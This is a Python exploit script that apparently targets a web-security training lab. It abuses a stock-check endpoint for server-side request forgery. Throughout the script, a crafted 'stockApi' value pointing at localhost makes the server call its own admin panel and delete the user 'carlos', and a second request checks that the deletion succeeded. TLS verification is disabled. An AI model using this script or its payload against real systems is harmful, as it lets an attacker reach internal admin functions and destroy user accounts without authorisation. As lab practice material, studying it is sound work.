#!/usr/bin/env python3

import requests
import sys
import urllib3



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def argv_check():
	if len(sys.argv) != 2:
		print("[!] Usage : %s <url> " %sys.argv[0])
		print("[!] Example : %s google.com" %sys.argv[0])


def del_user(url):
	#url = sys.argv[1]
	path = "/product/stock"
	ssrf_payload = "http://localhost/admin/delete?username=carlos"
	params = {"stockApi":ssrf_payload}
	

	r = requests.post(url+path,data=params,verify=False)

def check_exploit(url):
	path = "/product/stock"
	check_params = "http://localhost/admin"
	params = {"stockApi":check_params}
	

	r = requests.post(url+path,data=params,verify=False)
	if "User deleted successfully" in r.text:
		print("[+] User carlos deleted successfully")
	else:
		print("[-] Exploit Fail")

	

def main():
	url = sys.argv[1]
	argv_check()
	print("[+]Deleting user carlos....")
	del_user(url)
	check_exploit(url)





if __name__== "__main__":
	main()